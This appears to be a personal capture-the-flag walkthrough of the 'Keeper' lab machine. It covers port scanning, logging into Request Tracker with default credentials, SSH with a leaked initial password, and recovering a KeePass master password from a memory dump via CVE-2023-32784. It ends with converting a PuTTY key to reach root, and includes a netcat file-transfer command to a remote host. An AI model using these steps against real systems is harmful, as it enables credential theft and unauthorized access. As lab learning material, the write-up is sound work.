
This is the result of the scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
On the port 80 I found this

a message:

[To raise an IT support ticket, please visit tickets.keeper.htb/rt/](http://tickets.keeper.htb/rt/)

I put this to the 

This is a loggin
http://tickets.keeper.htb/rt/


And this is the image of the site 

![[Screenshot_2023-09-08_15_18_30.png]]

lets see whatweb and the launchpad of this machine

OpenSSH 8.9p1 Ubuntu 3ubuntu0.3
```
ubuntu jammy
```

nginx 1.18.0-6ubuntu8.2 source package in Ubuntu
```
[Hirsute](https://launchpad.net/ubuntu/hirsute)
```


SO, what is this?
```
Request Tracker (RT) is a ticketing system which
enables a group of people to intelligently and efficiently manage
tasks, issues, and requests submitted by a community of users. It
features web, email, and command-line interfaces (see the package
rt4-clients).
RT manages key tasks such as the identification, prioritization,
assignment, resolution, and notification required by
enterprise-critical applications, including project management, help
desk, NOC ticketing, CRM, and software development.
This package provides the 4 series of RT. It can be installed alongside
the 3.8 series without any problems.
This package provides an external FCGI interface for web servers
including, but not limited to, nginx, and is not needed for web servers
such as Apache which invoke FCGI programs directly.
```


FastCGI es un protocolo para interconectar programas interactivos con un servidor web. FastCGI es una variación de la ya conocida Common Gateway Interface. [Wikipedia](https://es.wikipedia.org/wiki/FastCGI)


whatweb gives me this
```.
http://tickets.keeper.htb/rt [200 OK] Cookies[RT_SID_tickets.keeper.htb.80], Country[RESERVED][ZZ], Email[sales@bestpractical.com], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[RT_SID_tickets.keeper.htb.80], IP[10.10.11.227], PasswordField[pass], Request-Tracker[4.4.4+dfsg-2ubuntu1], Script[text/javascript], Title[Login], X-Frame-Options[DENY], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Ok , the user is "root" and the password is "password"


maybe i can use this for something.. it is like a token oauth

![[Screenshot_2023-09-08_16_07_43.png]]
user info
```
Real Name Enoch Root

Email Address root@localhost

Name root
```

Another information of a user called

![[Screenshot_2023-09-08_16_12_26.png]]

lnorgaard

a commit:
New user. Initial password set to Welcome2023!

here i have a message when I put user data of Inorgaard


..... what is this ?? 
![[Screenshot_2023-09-08_16_15_14.png]]
```
/User/RelatedData.tsv?Type=User&id=14
```
On the configuration

http://tickets.keeper.htb/rt/Admin/Tools/Configuration.html

there is a loot of code
![[Screenshot_2023-09-08_16_22_54.png]]

here is telling somerhing about the disponible databases

![[Screenshot_2023-09-08_16_28_11.png]]

We have a place where we can put files, and script something, maybe  we can have a reverse shell over here

![[Screenshot_2023-09-08_16_29_44.png]]

Ok, im very stupid, but the way to get inside the machine (via ssh) is with the user;
lnorgaard
password
Welcome2023!


I found this files

KeePassDumpFull.dmp

passcodes.kdbx
  

El archivo DMP está asociado principalmente con el formato de archivo MemoryDump o Minidump. **Se utiliza en el sistema operativo Microsoft Windows para almacenar datos que se han descargado del espacio de memoria de la computadora**. Por lo general, los archivos DMP se crean cuando un archivo falla o se produce un error.


**Los archivos de datos creados por KeePass Password Safe** se conocen como archivos KDBX y por lo general se refieren a la contraseña de base de datos KeePass.


I was trying to get inside of the database but I do not have the password :(
```
mysql -h localhost -u rtuser -p rtdb
```

Now.. this is the data that the files give me 

```
lnorgaard@keeper:~$ file file
file: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type
lnorgaard@keeper:~$ file passcodes.kdbx 
passcodes.kdbx: Keepass password database 2.x KDBX
lnorgaard@keeper:~$ file KeePassDumpFull.dmp 
KeePassDumpFull.dmp: Mini DuMP crash report, 16 streams, Fri May 19 13:46:21 2023, 0x1806 type

```

So, the KeePass ...

https://www.hackplayers.com/2023/05/extraccion-de-la-contrasena-maestra-de-keepass.html
Within the compressed archive, I’ve observed the presence of two files, as indicated earlier. The DMG file has been extracted from memory. Upon investigation, I’ve identified the CVE-2023-32784 vulnerability, enabling me to successfully retrieve the master password.

![[Screenshot_2023-09-08_19_55_13.png]]

I send myself the file keepas.dmp

```
Reciver: `nc -l -p 1234 > filename.txt`

Sender: `nc server.com 1234 < filename.txt`
```

When you finish to transfer the files use md5sum and you can see if the file is completely integer 


This are some tools and info aobut KEEPASS

dmp            kdbx

https://github.com/vdohney/keepass-password-dumper

https://github.com/CMEPW/keepass-dump-masterkey



This seems to be the password
[

### Rødgrød med Fløde

](https://www.196flavors.com/es/rodgrod-med-flode/)

![[Screenshot_2023-09-08_20_25_09.png]]

Ok , so if you do not have keepass 2 you must install it keepass2

sudo apt install keepass2..


Now this program ask me for the password that we found recently

rødgrød med fløde

![[Screenshot_2023-09-08_20_37_13.png]]

This are two credentials, one from a user calledd root, and the lnorgaard user.

Now we have the password but it doesn't work when you try to get inside the ssh... but there is another thing .. called PUTTY ...ETC

![[Screenshot_2023-09-08_20_40_59.png]]

what is this ?

https://www.baeldung.com/linux/ssh-key-types-convert-ppk


We need to convert this putty key into a open ssh key.. this is the command to do it

```
puttygen pp_id_rsa.ppk -O private-openssh -o id_rsa
```

I did it :

![[Screenshot_2023-09-08_20_49_47.png]]

Now i need to try to connect via ssh
```
ssh root@targetip -i id_rsa
```

And that is all